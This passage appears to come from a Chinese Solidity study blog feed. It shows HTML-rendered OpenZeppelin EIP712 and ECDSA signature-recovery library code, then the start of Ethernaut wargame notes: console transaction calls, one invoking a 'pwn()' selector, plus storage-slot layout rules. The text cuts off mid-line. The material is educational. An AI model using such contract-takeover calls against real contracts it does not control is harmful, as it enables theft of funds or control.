class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev https://eips.ethereum.org/EIPS/eip-712[EIP 712] is a standard for hashing and signing of typed structured data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The encoding specified in the EIP is very generic, and such a generic implementation in Solidity is not feasible,</span></span><br><span class="line"><span class="comment"> * thus this contract does not implement the encoding itself. Protocols need to implement the type-specific encoding</span></span><br><span class="line"><span class="comment"> * they need in their contracts using a combination of `abi.encode` and `keccak256`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This contract implements the EIP 712 domain separator (&#123;_domainSeparatorV4&#125;) that is used as part of the encoding</span></span><br><span class="line"><span class="comment"> * scheme, and the final step of the encoding to obtain the message digest that is then signed via ECDSA</span></span><br><span class="line"><span class="comment"> * (&#123;_hashTypedDataV4&#125;).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The implementation of the domain separator was designed to be as efficient as possible while still properly updating</span></span><br><span class="line"><span class="comment"> * the chain id to protect against replay attacks on an eventual fork of the chain.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> This contract implements the version of the encoding known as &quot;v4&quot;, as implemented by the JSON RPC method</span></span><br><span class="line"><span class="comment"> * https://docs.metamask.io/guide/signing-data.html[`eth_signTypedDataV4` in MetaMask].</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * _Available since v3.4._</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">abstract contract EIP712 &#123;</span><br><span class="line">    <span class="comment">/* solhint-disable var-name-mixedcase */</span></span><br><span class="line">    <span class="comment">// Cache the domain separator as an immutable value, but also store the chain id that it corresponds to, in order to</span></span><br><span class="line">    <span class="comment">// invalidate the cached domain separator if the chain id changes.</span></span><br><span class="line">    bytes32 private immutable _CACHED_DOMAIN_SEPARATOR;</span><br><span class="line">    uint256 private immutable _CACHED_CHAIN_ID;</span><br><span class="line"></span><br><span class="line">    bytes32 private immutable _HASHED_NAME;</span><br><span class="line">    bytes32 private immutable _HASHED_VERSION;</span><br><span class="line">    bytes32 private immutable _TYPE_HASH;</span><br><span class="line">    <span class="comment">/* solhint-enable var-name-mixedcase */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Initializes the domain separator and parameter caches.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The meaning of `name` and `version` is specified in</span></span><br><span class="line"><span class="comment">     * https://eips.ethereum.org/EIPS/eip-712#definition-of-domainseparator[EIP 712]:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - `name`: the user readable name of the signing domain, i.e. the name of the DApp or the protocol.</span></span><br><span class="line"><span class="comment">     * - `version`: the current major version of the signing domain.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">NOTE:</span> These parameters cannot be changed except through a xref:learn::upgrading-smart-contracts.adoc[smart</span></span><br><span class="line"><span class="comment">     * contract upgrade].</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    constructor(<span class="built_in">string</span> memory name, <span class="built_in">string</span> memory version) &#123;</span><br><span class="line">        bytes32 hashedName = keccak256(bytes(name));</span><br><span class="line">        bytes32 hashedVersion = keccak256(bytes(version));</span><br><span class="line">        bytes32 typeHash = keccak256(<span class="string">&quot;EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)&quot;</span>);</span><br><span class="line">        _HASHED_NAME = hashedName;</span><br><span class="line">        _HASHED_VERSION = hashedVersion;</span><br><span class="line">        _CACHED_CHAIN_ID = block.chainid;</span><br><span class="line">        _CACHED_DOMAIN_SEPARATOR = _buildDomainSeparator(typeHash, hashedName, hashedVersion);</span><br><span class="line">        _TYPE_HASH = typeHash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the domain separator for the current chain.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _domainSeparatorV4() internal view <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (block.chainid == _CACHED_CHAIN_ID) &#123;</span><br><span class="line">            <span class="keyword">return</span> _CACHED_DOMAIN_SEPARATOR;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> _buildDomainSeparator(_TYPE_HASH, _HASHED_NAME, _HASHED_VERSION);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _buildDomainSeparator(bytes32 typeHash, bytes32 name, bytes32 version) private view <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(</span><br><span class="line">            abi.encode(</span><br><span class="line">                typeHash,</span><br><span class="line">                name,</span><br><span class="line">                version,</span><br><span class="line">                block.chainid,</span><br><span class="line">                address(this)</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Given an already https://eips.ethereum.org/EIPS/eip-712#definition-of-hashstruct[hashed struct], this</span></span><br><span class="line"><span class="comment">     * function returns the hash of the fully encoded EIP712 message for this domain.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * This hash can be used together with &#123;ECDSA-recover&#125; to obtain the signer of a message. For example:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * ```solidity</span></span><br><span class="line"><span class="comment">     * bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(</span></span><br><span class="line"><span class="comment">     *     keccak256(&quot;Mail(address to,string contents)&quot;),</span></span><br><span class="line"><span class="comment">     *     mailTo,</span></span><br><span class="line"><span class="comment">     *     keccak256(bytes(mailContents))</span></span><br><span class="line"><span class="comment">     * )));</span></span><br><span class="line"><span class="comment">     * address signer = ECDSA.recover(digest, signature);</span></span><br><span class="line"><span class="comment">     * ```</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function _hashTypedDataV4(bytes32 structHash) internal view virtual <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19\x01&quot;</span>, _domainSeparatorV4(), structHash));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ECDSAUpgradeable-sol-签名"><a href="#ECDSAUpgradeable-sol-签名" class="headerlink" title="ECDSAUpgradeable.sol (签名)"></a>ECDSAUpgradeable.sol (签名)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"><span class="comment">// OpenZeppelin Contracts (last updated v4.7.0) (utils/cryptography/ECDSA.sol)</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">import <span class="string">&quot;../StringsUpgradeable.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * These functions can be used to verify that a message was signed by the holder</span></span><br><span class="line"><span class="comment"> * of the private keys of a given address.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">library ECDSAUpgradeable &#123;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">RecoverError</span> &#123;</span></span><br><span class="line">        NoError,</span><br><span class="line">        InvalidSignature,</span><br><span class="line">        InvalidSignatureLength,</span><br><span class="line">        InvalidSignatureS,</span><br><span class="line">        InvalidSignatureV <span class="comment">// Deprecated in v4.8</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _throwError(RecoverError error) private pure &#123;</span><br><span class="line">        <span class="keyword">if</span> (error == RecoverError.NoError) &#123;</span><br><span class="line">            <span class="keyword">return</span>; <span class="comment">// no error: do nothing</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignature) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignatureLength) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature length&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (error == RecoverError.InvalidSignatureS) &#123;</span><br><span class="line">            revert(<span class="string">&quot;ECDSA: invalid signature &#x27;s&#x27; value&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the address that signed a hashed message (`hash`) with</span></span><br><span class="line"><span class="comment">     * `signature` or error string. This address can then be used for verification purposes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:</span></span><br><span class="line"><span class="comment">     * this function rejects them by requiring the `s` value to be in the lower</span></span><br><span class="line"><span class="comment">     * half order, and the `v` value to be either 27 or 28.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * IMPORTANT: `hash` _must_ be the result of a hash operation for the</span></span><br><span class="line"><span class="comment">     * verification to be secure: it is possible to craft signatures that</span></span><br><span class="line"><span class="comment">     * recover to arbitrary addresses for non-hashed data. A safe way to ensure</span></span><br><span class="line"><span class="comment">     * this is by receiving a hash of the original message (which may otherwise</span></span><br><span class="line"><span class="comment">     * be too long), and then calling &#123;toEthSignedMessageHash&#125; on it.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Documentation for signature generation:</span></span><br><span class="line"><span class="comment">     * - with https://web3js.readthedocs.io/en/v1.3.4/web3-eth-accounts.html#sign[Web3.js]</span></span><br><span class="line"><span class="comment">     * - with https://docs.ethers.io/v5/api/signer/#Signer-signMessage[ethers]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(bytes32 hash, bytes memory signature)</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (signature.length == <span class="number">65</span>) &#123;</span><br><span class="line">            bytes32 r;</span><br><span class="line">            bytes32 s;</span><br><span class="line">            uint8 v;</span><br><span class="line">            <span class="comment">// ecrecover takes the signature parameters, and the only way to get them</span></span><br><span class="line">            <span class="comment">// currently is to use assembly.</span></span><br><span class="line">            <span class="comment">/// @solidity memory-safe-assembly</span></span><br><span class="line">            assembly &#123;</span><br><span class="line">                r := mload(add(signature, <span class="number">0x20</span>))</span><br><span class="line">                s := mload(add(signature, <span class="number">0x40</span>))</span><br><span class="line">                v := byte(<span class="number">0</span>, mload(add(signature, <span class="number">0x60</span>)))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> tryRecover(hash, v, r, s);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignatureLength);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns the address that signed a hashed message (`hash`) with</span></span><br><span class="line"><span class="comment">     * `signature`. This address can then be used for verification purposes.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The `ecrecover` EVM opcode allows for malleable (non-unique) signatures:</span></span><br><span class="line"><span class="comment">     * this function rejects them by requiring the `s` value to be in the lower</span></span><br><span class="line"><span class="comment">     * half order, and the `v` value to be either 27 or 28.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * IMPORTANT: `hash` _must_ be the result of a hash operation for the</span></span><br><span class="line"><span class="comment">     * verification to be secure: it is possible to craft signatures that</span></span><br><span class="line"><span class="comment">     * recover to arbitrary addresses for non-hashed data. A safe way to ensure</span></span><br><span class="line"><span class="comment">     * this is by receiving a hash of the original message (which may otherwise</span></span><br><span class="line"><span class="comment">     * be too long), and then calling &#123;toEthSignedMessageHash&#125; on it.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(bytes32 hash, bytes memory signature)</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, signature);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-tryRecover&#125; that receives the `r` and `vs` short-signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See https://eips.ethereum.org/EIPS/eip-2098[EIP-2098 short signatures]</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(</span></span><br><span class="line"><span class="params">        bytes32 hash,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 vs</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        bytes32 s = vs &amp; bytes32(<span class="number">0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>);</span><br><span class="line">        uint8 v = uint8((uint256(vs) &gt;&gt; <span class="number">255</span>) + <span class="number">27</span>);</span><br><span class="line">        <span class="keyword">return</span> tryRecover(hash, v, r, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-recover&#125; that receives the `r and `vs` short-signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.2._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(</span></span><br><span class="line"><span class="params">        bytes32 hash,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 vs</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, r, vs);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-tryRecover&#125; that receives the `v`,</span></span><br><span class="line"><span class="comment">     * `r` and `s` signature fields separately.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * _Available since v4.3._</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">tryRecover</span><span class="params">(</span></span><br><span class="line"><span class="params">        bytes32 hash,</span></span><br><span class="line"><span class="params">        uint8 v,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 s</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(address, RecoverError)</span> &#123;</span><br><span class="line">        <span class="comment">// EIP-2 still allows signature malleability for ecrecover(). Remove this possibility and make the signature</span></span><br><span class="line">        <span class="comment">// unique. Appendix F in the Ethereum Yellow paper (https://ethereum.github.io/yellowpaper/paper.pdf), defines</span></span><br><span class="line">        <span class="comment">// the valid range for s in (301): 0 &lt; s &lt; secp256k1n ÷ 2 + 1, and for v in (302): v ∈ &#123;27, 28&#125;. Most</span></span><br><span class="line">        <span class="comment">// signatures from current libraries generate a unique signature with an s-value in the lower half order.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// If your library generates malleable signatures, such as s-values in the upper range, calculate a new s-value</span></span><br><span class="line">        <span class="comment">// with 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141 - s1 and flip v from 27 to 28 or</span></span><br><span class="line">        <span class="comment">// vice versa. If your library also generates signatures with 0/1 for v instead 27/28, add 27 to v to accept</span></span><br><span class="line">        <span class="comment">// these malleable signatures as well.</span></span><br><span class="line">        <span class="keyword">if</span> (uint256(s) &gt; <span class="number">0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignatureS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the signature is valid (and not malleable), return the signer address</span></span><br><span class="line">        address signer = ecrecover(hash, v, r, s);</span><br><span class="line">        <span class="keyword">if</span> (signer == address(<span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (address(<span class="number">0</span>), RecoverError.InvalidSignature);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (signer, RecoverError.NoError);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Overload of &#123;ECDSA-recover&#125; that receives the `v`,</span></span><br><span class="line"><span class="comment">     * `r` and `s` signature fields separately.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">recover</span><span class="params">(</span></span><br><span class="line"><span class="params">        bytes32 hash,</span></span><br><span class="line"><span class="params">        uint8 v,</span></span><br><span class="line"><span class="params">        bytes32 r,</span></span><br><span class="line"><span class="params">        bytes32 s</span></span><br><span class="line"><span class="params">    )</span> internal pure <span class="title function_">returns</span> <span class="params">(address)</span> &#123;</span><br><span class="line">        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);</span><br><span class="line">        _throwError(error);</span><br><span class="line">        <span class="keyword">return</span> recovered;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Message, created from a `hash`. This</span></span><br><span class="line"><span class="comment">     * produces hash corresponding to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-191.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes32 hash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="comment">// 32 is the length in bytes of hash,</span></span><br><span class="line">        <span class="comment">// enforced by the type signature above</span></span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n32&quot;</span>, hash));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Message, created from `s`. This</span></span><br><span class="line"><span class="comment">     * produces hash corresponding to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-191.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toEthSignedMessageHash</span><span class="params">(bytes memory s)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19Ethereum Signed Message:\n&quot;</span>, StringsUpgradeable.toString(s.length), s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @dev Returns an Ethereum Signed Typed Data, created from a</span></span><br><span class="line"><span class="comment">     * `domainSeparator` and a `structHash`. This produces hash corresponding</span></span><br><span class="line"><span class="comment">     * to the one signed with the</span></span><br><span class="line"><span class="comment">     * https://eips.ethereum.org/EIPS/eip-712[`eth_signTypedData`]</span></span><br><span class="line"><span class="comment">     * JSON-RPC method as part of EIP-712.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * See &#123;recover&#125;.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    function <span class="title function_">toTypedDataHash</span><span class="params">(bytes32 domainSeparator, bytes32 structHash)</span> internal pure <span class="title function_">returns</span> <span class="params">(bytes32)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> keccak256(abi.encodePacked(<span class="string">&quot;\x19\x01&quot;</span>, domainSeparator, structHash));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> -solidity学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity刷题知识点ethernaut</title>
      <link href="/2022/12/15/solidity/%E6%9D%82%E4%B9%B1/solidity%E5%88%B7%E9%A2%98%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2022/12/15/solidity/%E6%9D%82%E4%B9%B1/solidity%E5%88%B7%E9%A2%98%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="发送交易信息的另一种方法"><a href="#发送交易信息的另一种方法" class="headerlink" title="发送交易信息的另一种方法"></a>发送交易信息的另一种方法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.sendTransactio(&#123;data:web3.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br><span class="line">await contract.sendTransaction(&#123;value:<span class="number">1</span>&#125;);</span><br><span class="line">await contract.sendTransaction(&#123;data:<span class="number">0xdd365b8b</span>&#125;);<span class="comment">//函数签名</span></span><br></pre></td></tr></table></figure><h2 id="以太坊数据储存形式的知识"><a href="#以太坊数据储存形式的知识" class="headerlink" title="以太坊数据储存形式的知识"></a>以太坊数据储存形式的知识</h2><ul><li>存储插槽的第一项会以低位对齐（即右对齐）的方式储存</li><li>基本类型仅使用存储它们所需的字节</li><li>如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移  入 下一个存储插槽</li><li>结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）</li></ul><p>每一个槽有32个字节<br>数字：四位一字节<br>字母：两位一字节<br>布尔值：一个字节<br>bytes32就是32个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address a;<span class="comment">//20  槽0</span></span><br><span class="line">uint8 b;<span class="comment">//1      槽0</span></span><br><span 